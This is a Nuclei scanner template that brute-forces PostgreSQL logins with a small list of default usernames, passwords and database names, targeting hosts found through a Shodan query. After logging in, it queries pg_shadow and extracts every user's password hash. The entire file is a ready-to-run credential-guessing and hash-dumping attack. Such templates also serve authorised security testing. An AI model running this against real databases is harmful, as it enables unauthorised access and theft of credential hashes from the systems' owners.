id: pgsql-exec
info:
  author: pussycat0x
  description: 'PostgreSQL List Password Hashes

    '
  metadata:
    shodan-query: product:"PostgreSQL"
  name: PostgreSQL List Password Hashes
  reference:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-password-hashes
  - https://launchbylunch.com/posts/2024/Jan/16/postgres-password-encryption/#postgresql-password-encryption-scram-sha-256
  severity: info
  tags: brute,network,postgresql
javascript:
- args:
    Db: '{{database}}'
    Host: '{{Host}}'
    Pass: '{{password}}'
    Port: 5432
    User: '{{usernames}}'
  attack: clusterbomb
  code: 'const postgres = require(''nuclei/postgres'');

    const client = new postgres.PGClient;

    connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, "SELECT usename,
    passwd FROM pg_shadow");

    Export(connected)

    '
  extractors:
  - json:
    - '.Rows[] | "\(.usename) : \(.passwd)"'
    type: json
  payloads:
    database:
    - foresight
    - postgres
    - template0
    - template1
    - test
    password:
    - postgres
    - password
    - secret
    - admin
    - null
    usernames:
    - postgres
    - meow
    - admin
